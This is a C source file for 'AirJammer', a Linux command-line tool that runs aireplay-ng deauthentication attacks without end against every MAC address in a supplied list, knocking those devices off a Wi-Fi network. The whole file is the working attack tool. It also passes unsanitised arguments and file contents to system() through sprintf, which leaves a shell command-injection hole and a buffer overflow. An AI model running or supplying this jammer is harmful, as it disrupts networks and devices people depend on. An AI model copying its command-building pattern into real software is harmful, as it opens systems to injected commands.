/**
        AirJammer - Command Line Interface

        Main interface
        airjammer.c
**/

#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//general library header
#include "lib.h"

//prototypes
char **readFile(char *, int *);


int main (int argc, char *argv[])
{
	int i, dim;
	char death[]={"aireplay-ng --deauth 1 -a"}, **maclist, cmd[BUFF];

	if (argc < 4) {
		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
		return FAIL;
	}
	//check execution permissions
    if (getgid() != 0) {
        printf("Run it as root!\n");
		return FAIL;
    }
	dim = 0;
	//reading MACs list
	if ((maclist = readFile(argv[3], &dim)) == NULL)
		return FAIL;

	while (TRUE) {
		for (i=0; i<dim; i++) {
			sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, argv[1], maclist[i], argv[2]);
			fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
			system(cmd);
		}
	}
	freeMem(maclist, dim);

	return SUCCESS;
}


char **readFile(char *source, int *dim)
{
	FILE *fp;
	char cmd[BUFF], **maclist;
	int i;

	//opening file containing MAC list
	if ((fp = fopen(source, "r")) == NULL) {
		fprintf(stderr, "Error opening file \"%s\".\n", source);
		return NULL;
	}
	//checking list lenght
	while (fgets(cmd, BUFF, fp) != NULL)
		(*dim)++;
	rewind(fp);
	if ((maclist = (char**)malloc((*dim) * sizeof(char*))) == NULL) {
		fprintf(stderr, "Error allocating memory (1) [dim. %d]\n", *dim);
		return NULL;
	}
	//reading file
	for (i=0; i<*dim; i++) {
		fscanf(fp, "%s", cmd);
		if ((maclist[i] = strdup(cmd)) == NULL) {
			fprintf(stderr, "Error allocating memory (2)\n");
			freeMem(maclist, i);
			return NULL;
		}
	}
	return maclist;
}

